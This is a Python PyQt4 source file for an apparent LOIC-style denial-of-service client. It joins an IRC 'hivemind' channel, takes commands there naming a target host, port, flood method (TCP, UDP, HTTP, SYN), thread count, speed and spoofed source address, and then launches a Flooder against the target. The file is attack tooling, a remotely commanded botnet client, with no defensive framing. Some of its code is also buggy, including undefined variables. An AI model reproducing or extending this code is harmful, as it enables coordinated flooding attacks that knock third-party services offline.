import sys, time

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from Core.Events import *
from Core.IRC import * 
from Core.Flooder import *
from Core.Globals import *

class defaultTab(QWidget):

    def __init__(self, parent=None):
        QWidget.__init__(self, parent)

        self.server = QLineEdit("irc.hiddenaces.net")
        self.port = QLineEdit("6667")
        self.port.setValidator(QIntValidator())
        self.channel = QLineEdit("#loic")

        self.start = QPushButton("join")

        layout = QGridLayout()

        layout.addWidget(QLabel("server:"), 0, 0)
        layout.addWidget(self.server, 0, 1)

        layout.addWidget(QLabel("port:"), 1, 0)
        layout.addWidget(self.port, 1, 1)

        layout.addWidget(QLabel("channel:"), 2, 0)
        layout.addWidget(self.channel, 2, 1)

        layout.addWidget(self.start, 3, 0, 1, 4)

        self.setLayout(layout)
        self.setMinimumSize(200, 200)
        self.show()

class main(QMainWindow):

    def __init__(self, parent=None):
        QMainWindow.__init__(self, parent)

        self.irc = None
        self.flooder = None

        self.server = None
        self.port = None
        self.channel = None

        self.timeout = 9001
        self.subsite = "/"
        self.port = 80
        self.message = "U dun goofed"
        self.method = []
        self.method.append(TCP_METHOD)
        self.speed = 0
        self.random = False
        self.srchost = "192.168.0.1"
        self.srcport = 4321

        listener = Listener(LAZER_RECV, self.lazerParseHook)
        getEventManager().addListener(listener)
        listener = Listener(START_LAZER, self.lazerStartHook)
        getEventManager().addListener(listener)
        listener = Listener(IRC_RESTART, self.restartIRCHook)
        getEventManager().addListener(listener)

        getEventManager().start()

        self.tabWidget = QTabWidget()
        self.defTab = defaultTab()
        self.tabWidget.addTab(self.defTab, "default")

        self.defTab.start.clicked.connect(self.hivemindStart)

        self.setCentralWidget(self.tabWidget)

    def stop(self):
        if self.flooder:
            self.flooder.stop()
        if self.irc:
            self.irc.stop()
        getEventManager().stop()

    def hivemindStart(self):
        if self.irc != None:
            msgBox = QMessageBox();
            msgBox.setText("Hivemind is already running.")
            if self.server == str(self.defTab.server):
                msgBox.setInformativeText("Do you want to change channel?")
            else:
                msgBox.setInformativeText("Do you want to change server?")
            msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
            msgBox.setDefaultButton(QMessageBox.Cancel)
            ret = msgBox.exec_()

            if ret == QMessageBox.Cancel:
                return

            if self.server == str(self.defTab.server.text()):
                self.channel = str(self.defTab.channel.text())
                self.irc.changeChannel(str(self.defTab.channel.text()))
            else:
                irc.disconnect()
                irc.host = str(self.defTab.server.text())
                irc.port = int(self.defTab.port.text())
                irc.channel = str(self.defTab.channel.text())
                irc.connect()

        self.server = str(self.defTab.server.text())
        self.port = int(self.defTab.port.text())
        self.channel = str(self.defTab.channel.text())

        if self.irc == None:
            self.irc = IRC(self.server, self.port, self.channel)

    def lazerParseHook(self, event):
        s = []
        for x in event.arg:
            t = x.split('=')
            if len(t) > 1:
                for y in t:
                    s.append(y)
            else:
                if t[0] == "start":
                    self.status = START
                elif t[0] == "default": #needs to be fleshed out more
                    self.timeout = 9001
                    self.subsite = "/"
                    self.port = 80
                    self.message = "U dun goofed"
                    self.method.append(TCP_METHOD)
                    self.speed = 0
                    self.random = False
                    self.srchost = "192.168.0.1"
                    self.srcport = 4321

        for x in range(0, len(s), 2):
            if s[x] == "targetip" or s[x] == "targethost":
                self.targetip = socket.gethostbyname(s[x+1])
            elif s[x] == "timeout":
                if s[x+1].isdigit():
                    timeout = int(s[x+1])
                    if(timeout < -1):
                        self.timeout = None
            elif s[x] == "subsite":
                self.subsite = s[x+1]
            elif s[x] == "message":
                self.message = s[x+1]
            elif s[x] == "port":
                if s[x+1].isdigit():
                    port = int(s[x+1])
                    if port > 65535:
                        self.port = None
                    elif port < 1:
                        self.port = None
                    else:
                        self.port = port
            elif s[x] == "method":
                methodTemp = s[x+1].split(",")
                self.method = []
                for x in methodTemp:
                    if x.upper() == "UDP":
                        self.method.append(UDP_METHOD)
                    elif x.upper() == "HTTP":
                        self.method.append(HTTP_METHOD)
                    elif x.upper() == "SYN":
                        self.method.append(SYN_METHOD)
                    else:
                        self.method.append(TCP_METHOD)
            elif s[x] == "threads":
                if s[x+1].isdigit():
                    threads = int(s[x+1])
                    if threads > 100:
                        self.threads = 100
                    elif threads < 1:
                        self.threads = 1
                    else:
                        self.threads = threads
            elif s[x] == "wait":
                wait = s[x+1]
                if wait.lower() == "true":
                    self.wait = True
                else:
                    self.wait = False
            elif s[x] == "random":
                random = s[x+1]
                if random.lower() == "true":
                    self.random = True
                else:
                    self.random = None
            elif s[x] == "speed":
                if s[x+1].isdigit():
                    speed = int(s[x+1])
                    if speed > 20:
                        self.speed = 20
                    elif speed < 1:
                        self.speed = 1
                    else:
                        self.speed = speed
            elif s[x] == "srchost":
                self.srchost = s[x+1]
            elif s[x] == "srcport":
                if s[x+1].isdigit():
                    srcport = int(s[x+1])
                    if srcport < -1 or srcport > 65535:
                        self.srcport = None
                    else:
                        self.srcport = srcport

        if self.status == START:
            event = Event(START_LAZER, None)
            getEventManager().signalEvent(event)
        else:
            self.status = WAITING

    def lazerStartHook(self, event):
        if self.status == START:
            if self.flooder != None:
                self.flooder.stop()

            if self.targetip == None or self.port == None:
                print "no target set"
                return

            if self.timeout == None:
                print "Missing required timeout"
                return
            if len(self.method) == 0:
                print "Missing required method"
                return
            if self.threads == None:
                print "Missing required thread amount"
                return

            self.flooder = Flooder(self.targetip, self.port, self.timeout, self.method, self.threads, self.subsite, self.message, self.random, self.wait, self.srchost, self.srcport)
            self.flooder.start()

    def restartIRCHook(self, event):
        time.sleep(5)
        irc.connect()

        

if __name__ == "__main__":
    app = QApplication(sys.argv)
    myapp = main()
    myapp.show()
    app.exec_()
    myapp.stop()
    sys.exit()


